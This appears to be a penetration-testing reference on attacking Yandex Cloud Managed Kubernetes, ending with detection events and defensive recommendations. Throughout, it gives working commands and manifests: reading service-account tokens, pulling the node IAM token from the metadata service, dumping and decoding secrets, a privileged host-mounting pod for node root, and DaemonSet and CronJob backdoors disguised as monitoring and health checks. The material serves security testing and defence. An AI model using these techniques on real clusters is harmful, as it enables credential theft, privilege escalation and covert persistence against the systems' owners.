# Managed Kubernetes

## Overview

Managed Kubernetes runs K8s clusters on Yandex Cloud infrastructure. The intersection of Kubernetes RBAC and Yandex Cloud IAM creates unique escalation paths. Network policies are not enforced by default.

## Credential Access

### Pod Service Account Token

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

If the pod's K8s service account is bound to a Yandex Cloud service account, this token grants cloud API access.

### Node Metadata Service

From inside a pod (if no NetworkPolicy blocks it):

```bash
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

Returns the **node's** service account IAM token — often more privileged than the pod SA.

### Kubernetes Secrets

```bash
kubectl get secrets --all-namespaces
kubectl get secret <name> -n <ns> -o jsonpath='{.data}' | base64 -d
```

Secrets may contain: database passwords, API keys, TLS certificates, registry credentials.

### Image Pull Secrets

```bash
kubectl get serviceaccount <sa> -n <ns> -o jsonpath='{.imagePullSecrets}'
kubectl get secret <pull-secret> -n <ns> -o json
```

Contains Container Registry credentials.

---

## Privilege Escalation

### Pod → Cloud via Metadata

1. Access pod (exploit, exposed service, CI/CD)
2. Hit metadata service for node SA token
3. Use token to call Yandex Cloud APIs
4. Escalate based on node SA's roles

### Privileged Pod Deployment

With `cluster-admin` or appropriate RBAC:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: shell
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
```

This gives root access to the underlying node.

### No Default Network Policies

By default, Managed Kubernetes has **no NetworkPolicy enforcement**. All pods can communicate with all other pods and with the metadata service. This enables:
- Lateral movement between pods/namespaces
- Metadata service access from any pod
- Service-to-service attacks within the cluster

---

## Lateral Movement

### Pod-to-Cloud Pivot

From a compromised pod:
1. Get node metadata SA token
2. Enumerate cloud resources (VMs, S3, Lockbox, DBs)
3. Access resources based on node SA permissions
4. Deploy new workloads with different SA bindings

### Cross-Namespace Movement

Without NetworkPolicy, pods in one namespace can reach services in another namespace via cluster DNS (`<svc>.<ns>.svc.cluster.local`).

---

## Persistence

### Backdoor DaemonSet

Deploy a DaemonSet that runs on every node:

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: monitoring-agent
spec:
  selector:
    matchLabels:
      app: monitoring
  template:
    spec:
      hostNetwork: true
      containers:
      - name: agent
        image: <backdoor-image>
```

### CronJob Persistence

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: health-check
spec:
  schedule: "*/30 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: check
            image: <backdoor-image>
```

### Mutating Webhook

A mutating admission webhook can inject sidecar containers into every new pod, providing persistent interception.

---

## Enumeration

```bash
# Cluster discovery
yc managed-kubernetes cluster list --folder-id <folder-id>
yc managed-kubernetes cluster get <cluster-id>
yc managed-kubernetes cluster get-credentials <cluster-id>

# K8s enumeration
kubectl get namespaces
kubectl get pods --all-namespaces
kubectl get services --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces
kubectl get networkpolicies --all-namespaces
kubectl get clusterrolebindings
kubectl auth can-i --list
```

---

## Detection

| Event | Source |
|---|---|
| Cluster credential fetch | Audit Trails: `managed-kubernetes.clusters.getCredentials` |
| Privileged pod creation | K8s audit logs |
| Metadata service access | VPC flow logs |
| RBAC changes | K8s audit logs |

## Defensive Recommendations

1. Deploy NetworkPolicies — block pod access to `169.254.169.254`
2. Use Pod Security Standards to prevent privileged pods
3. Bind minimum-privilege cloud SAs to node groups
4. Enable K8s audit logging
5. Use separate node groups for different trust levels
6. Regularly review RBAC bindings
